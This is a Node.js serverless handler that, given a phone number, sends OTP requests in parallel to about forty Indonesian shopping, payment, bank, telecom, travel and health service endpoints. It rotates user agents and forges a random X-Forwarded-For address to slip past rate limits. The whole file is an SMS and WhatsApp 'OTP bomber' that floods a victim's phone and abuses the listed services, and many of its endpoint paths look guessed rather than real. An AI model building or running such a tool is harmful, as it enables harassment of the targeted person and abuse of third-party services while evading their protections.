const axios = require('axios');

const apiEndpoints = [
  { name: "Tokopedia", url: "https://api.tokopedia.com/v1/user/otp/request", body: { phone: "{phone}", type: "whatsapp" } },
  { name: "Shopee", url: "https://shopee.co.id/api/v2/authentication/resend_otp", body: { phone: "{phone}", channel: "whatsapp", otp_type: "register" } },
  { name: "Shopee2", url: "https://shopee.co.id/api/v2/authentication/send_otp", body: { phone: "{phone}", channel: "sms", otp_type: "login" } },
  { name: "Bukalapak", url: "https://api.bukalapak.com/v2/authenticate/request_otp", body: { phone: "{phone}", type: "whatsapp" } },
  { name: "Bukalapak2", url: "https://api.bukalapak.com/v2/authenticate/register_otp", body: { phone: "{phone}", type: "sms" } },
  { name: "Blibli", url: "https://www.blibli.com/backend/api/otp/request", body: { phone: "{phone}", type: "register" } },
  { name: "Lazada", url: "https://member.lazada.co.id/api/user/otp/send", body: { phone: "{phone}", type: "register" } },
  { name: "JD.ID", url: "https://api.jd.id/sendOtp", body: { phone: "{phone}", otpType: "login" } },
  { name: "Zalora", url: "https://www.zalora.co.id/api/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "Matahari", url: "https://api.matahari.com/v1/otp/send", body: { phone: "{phone}", type: "register" } },
  { name: "OVO", url: "https://api.ovo.id/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "DANA", url: "https://api.dana.id/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "GoPay", url: "https://api.gojekapi.com/v3/otp/request", body: { phone: "{phone}", type: "login" } },
  { name: "LinkAja", url: "https://api.linkaja.id/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "Jenius", url: "https://api.jenius.com/v1/otp/request", body: { phone: "{phone}", type: "login" } },
  { name: "Akulaku", url: "https://api.akulaku.com/v1/user/sendOtp", body: { mobile: "{phone}", type: "login" } },
  { name: "Kredivo", url: "https://api.kredivo.com/v2/otp/send", body: { phone: "{phone}", purpose: "register" } },
  { name: "Gojek", url: "https://api.gojekapi.com/v3/otp/request", body: { phone: "{phone}", type: "login" } },
  { name: "Grab", url: "https://api.grab.com/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "Traveloka", url: "https://api.traveloka.com/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "Tiket.com", url: "https://api.tiket.com/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "Telkomsel", url: "https://api.telkomsel.com/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "XL", url: "https://api.xl.co.id/v1/otp/request", body: { phone: "{phone}", type: "register" } },
  { name: "Indosat", url: "https://api.indosatooredoo.com/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "Tri", url: "https://api.tri.co.id/v1/otp/request", body: { phone: "{phone}", type: "register" } },
  { name: "GoFood", url: "https://api.gojekapi.com/gofood/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "GrabFood", url: "https://api.grab.com/food/v1/otp/send", body: { phone: "{phone}", type: "register" } },
  { name: "Halodoc", url: "https://api.halodoc.com/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "Alodokter", url: "https://api.alodokter.com/v1/otp/request", body: { phone: "{phone}", type: "register" } },
  { name: "Sociolla", url: "https://api.sociolla.com/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "Ruangguru", url: "https://api.ruangguru.com/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "Zenius", url: "https://api.zenius.net/v1/otp/request", body: { phone: "{phone}", type: "register" } },
  { name: "HomeCredit", url: "https://api.homecredit.co.id/v1/otp/send", body: { phone: "{phone}", type: "register" } },
  { name: "BCA", url: "https://api.bca.co.id/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "BRI", url: "https://api.bri.co.id/v1/otp/request", body: { phone: "{phone}", type: "login" } },
  { name: "Mandiri", url: "https://api.bankmandiri.co.id/v1/otp/request", body: { phone: "{phone}", type: "login" } },
  { name: "BNI", url: "https://api.bni.co.id/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "PegiPegi", url: "https://api.pegipegi.com/v1/otp/send", body: { phone: "{phone}", type: "login" } },
  { name: "JNE", url: "https://api.jne.co.id/v1/otp/request", body: { phone: "{phone}", type: "register" } },
  { name: "JNT", url: "https://api.jnt.co.id/v1/otp/send", body: { phone: "{phone}", type: "login" } },
];

const userAgents = [
  "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
];

function generateIP() {
  return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'POST only' });

  const { phone } = req.body;
  if (!phone) return res.status(400).json({ error: 'phone required' });

  const results = await Promise.allSettled(
    apiEndpoints.map(async (api) => {
      const bodyStr = JSON.stringify(api.body).replace('{phone}', phone);
      const body = JSON.parse(bodyStr);
      const headers = {
        'Content-Type': 'application/json',
        'User-Agent': userAgents[Math.floor(Math.random()*userAgents.length)],
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'id-ID,id;q=0.9',
        'Origin': api.url.split('/api/')[0] || 'https://www.tokopedia.com',
        'Referer': api.url.split('/api/')[0] || 'https://www.tokopedia.com/',
        'X-Forwarded-For': generateIP(),
        'Cache-Control': 'no-cache',
      };
      try {
        const response = await axios.post(api.url, body, { headers, timeout: 8000, validateStatus: () => true });
        return { name: api.name, success: true, status: response.status };
      } catch (error) {
        return { name: api.name, success: false, error: error.code };
      }
    })
  );

  const successCount = results.filter(r => r.status === 'fulfilled' && r.value.success).length;
  const failedCount = results.filter(r => r.status === 'rejected' || !r.value.success).length;

  res.json({
    success: true,
    totalApis: apiEndpoints.length,
    successCount,
    failedCount,
    results: results.map(r => r.status === 'fulfilled' ? r.value : { name: 'unknown', success: false })
  });
};
